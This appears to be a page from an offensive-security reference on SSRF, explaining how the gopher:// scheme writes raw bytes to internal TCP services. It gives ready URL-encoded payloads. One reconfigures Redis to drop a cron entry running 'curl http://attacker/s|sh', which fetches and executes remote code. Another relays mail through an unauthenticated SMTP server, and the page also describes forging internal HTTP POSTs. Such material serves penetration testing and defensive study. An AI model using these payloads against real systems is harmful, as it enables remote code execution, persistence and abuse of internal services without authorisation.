---
title: "Gopher scheme for raw-socket SSRF"
description: "The gopher:// handler writes attacker-controlled bytes to a TCP port, which smuggles crafted protocol payloads into Redis, SMTP, and HTTP services and is the most powerful SSRF scheme."
keywords:
  - gopher scheme
  - gopher://
  - Redis RCE
  - raw TCP
  - SMTP smuggling
  - CRLF payload
---

# Gopher

The `gopher://` scheme is the strongest SSRF escalation because it writes an arbitrary byte stream to a chosen TCP port. Where [DICT](dict.md) sends one line, gopher sends a whole crafted request, so it smuggles complete protocol exchanges into internal services that assume only trusted local clients reach them.

## How the bytes are built

The URL is `gopher://host:port/` followed by a single item-type character (conventionally `_`, and ignored) and then the payload, URL-encoded. Carriage return and line feed are `%0d%0a`, which is what lets a payload span the multiple lines a real protocol needs:

```
gopher://127.0.0.1:6379/_<url-encoded bytes>
```

Everything after the item-type character is sent verbatim on the connection.

## Redis

Redis accepts inline commands terminated by CRLF, so a gopher payload drives it directly. A simple write, with `%0d%0a` ending the line:

```
gopher://127.0.0.1:6379/_set%20ssrf%20proof%0d%0a
```

Chaining several CRLF-separated lines in one payload runs a sequence. The classic persistence route reconfigures where Redis saves its database and writes an attacker-controlled key, so the dump lands as a usable file (a cron entry under `/var/spool/cron`, an authorized key, or a web shell in a served directory):

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSET%20x%20%22%0a*%20*%20*%20*%20*%20curl%20http://attacker/s%7Csh%0a%22%0d%0aSAVE%0d%0a
```

Each `%0d%0a` is one line break; Redis executes `CONFIG SET dir`, `CONFIG SET dbfilename`, `SET`, then `SAVE`, writing the key as the file contents.

## SMTP and HTTP

The same primitive speaks any text protocol. An internal SMTP server with no authentication relays mail when handed a full envelope:

```
gopher://127.0.0.1:25/_HELO%20x%0d%0aMAIL%20FROM:<a@x>%0d%0aRCPT%20TO:<b@y>%0d%0aDATA%0d%0aSubject:test%0d%0a%0d%0abody%0d%0a.%0d%0a
```

A crafted HTTP request to an internal service (including a `POST` with a body, which a plain `http://` sink cannot shape) is written the same way, line by line with `%0d%0a`, letting gopher forge requests a normal HTTP fetch could not.

## Why it is the priority scheme

Gopher converts SSRF from a read primitive into a write primitive against internal services, which is the step from information disclosure to code execution. When a [Port](../authority/port.md) scan finds Redis, memcached, or an unauthenticated SMTP or HTTP service, gopher is the scheme that acts on it. It depends on the client honoring `gopher://` (curl-backed clients commonly do), so confirm the handler first.

## References

- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [curl: supported protocols](https://curl.se/docs/url-syntax.html)
